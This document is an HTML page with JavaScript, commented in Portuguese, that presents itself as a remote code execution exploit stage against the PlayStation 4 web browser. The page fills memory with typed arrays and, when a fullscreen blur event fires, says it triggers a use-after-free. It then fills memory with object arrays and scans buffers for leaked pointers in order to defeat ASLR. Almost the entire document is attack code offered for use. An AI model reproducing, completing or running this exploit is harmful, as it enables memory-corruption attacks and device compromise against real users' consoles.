
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 RCE - EXPLOIT 7 v2 (REFINED SCANNER)</title>
    <style>
        body { background-color: #000; color: #00ff00; font-family: 'Consolas', monospace; padding: 10px; font-size: 14px; }
        #log { border: 1px solid #333; padding: 10px; margin-top: 10px; background: #050505; min-height: 400px; }
        button { width: 100%; padding: 15px; background: #222; color: #0f0; border: 2px solid #0f0; font-weight: bold; cursor: pointer; font-size: 16px; }
        .success { color: #fff; background: #008800; padding: 5px; border: 1px solid #0f0; }
        .pointer { color: #00ffff; font-weight: bold; font-size: 1.3em; }
        .float-ignore { color: #555; font-size: 0.8em; }
    </style>
</head>
<body>

<h1>EXPLOIT 7 v2: POINTER HUNTER</h1>
<p>Status: Filtro de Floats (0x3ff...) ATIVADO.</p>

<button id="btnRun" onclick="runExploit()">INICIAR CAÇADA</button>
<div id="log">Logs...</div>

<script>
    const LOG = document.getElementById('log');
    function log(msg) { LOG.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`; }
    function logHTML(html) { LOG.innerHTML += html; }

    var controllers = [];
    var sprayStorage = [];
    
    // Objeto alvo para vazar endereço
    var targetObj = { id: 0x1337, mark: 0xBEEF };

    function runExploit() {
        document.getElementById('btnRun').disabled = true;
        log("1. Alocando Vítimas...");
        
        controllers = [];
        sprayStorage = [];

        for(let i=0; i<8000; i++) {
            let c = new Float64Array(8);
            c[0] = i; 
            c.fill(1.1, 1);
            controllers.push(c);
        }

        log("2. Fullscreen... Prepare o OPTIONS.");
        var el = document.documentElement;
        if(el.webkitRequestFullscreen) el.webkitRequestFullscreen();

        window.onblur = function() {
            log(">>> UAF DISPARADO! Spraying Objects...");

            // TÁTICA NOVA: SPRAY MAIS DENSO
            // Usamos arrays maiores para garantir que o alocador use a mesma região
            try {
                for(let k=0; k<20000; k++) {
                    // Spray misto: Ponteiros e Marcadores
                    let s = [targetObj, targetObj, 0x1337, targetObj];
                    sprayStorage.push(s);
                }
            } catch(e) {}

            log("Spray feito. Escaneando (Ignorando 1.0 e 1.1)...");
            setTimeout(scanForPointers, 200);
        };
    }

    function scanForPointers() {
        let found = false;

        for(let i=0; i<controllers.length; i++) {
            let victim = controllers[i];
            
            try {
                let dv = new DataView(victim.buffer);
                let valLow = dv.getUint32(0, true);
                let valHigh = dv.getUint32(4, true);

                // FILTRO DE "FALSO POSITIVO" (FLOATS)
                // 0x3ff... e 0x400... são números floats pequenos (1.0, 2.0 etc)
                // Ponteiros reais geralmente são 0x000... (Userland) ou 0xffff... (Kernel - raro aqui)
                // Se começar com 3ff ou 00000000 (zero), ignoramos.
                
                // Queremos algo que NÃO seja zero e NÃO seja Float
                if (valHigh !== 0 && (valHigh & 0xFFF00000) !== 0x3FF00000) {
                    
                    found = true;
                    let hex = "0x" + valHigh.toString(16).padStart(8,'0') + valLow.toString(16).padStart(8,'0');
                    
                    logHTML(`<div class='success'>!!! PONTEIRO REAL DETECTADO (INDEX ${i}) !!!</div>`);
                    logHTML(`Valor Raw: <span class='pointer'>${hex}</span>`);
                    
                    // Se o valor começar com 0x0000... e tiver números depois, é BINGO.
                    if((valHigh & 0xFFFF0000) === 0) {
                         logHTML("<div style='color:cyan'>CONFIRMADO: ENDEREÇO USERLAND VÁLIDO.</div>");
                         logHTML("<div>ASLR DEFEATED.</div>");
                    }

                    // Dump
                    let dump = "";
                    for(let off=0; off<32; off+=8) {
                        let h = dv.getUint32(off+4, true);
                        let l = dv.getUint32(off, true);
                        dump += `Off ${off}: 0x${h.toString(16)}${l.toString(16)}<br>`;
                    }
                    logHTML(dump);
                    return; 
                }
            } catch(e) {}
        }

        if(!found) {
            log("Apenas dados originais (Floats) encontrados. Tente de novo.");
        }
    }
</script>
</body>
</html>
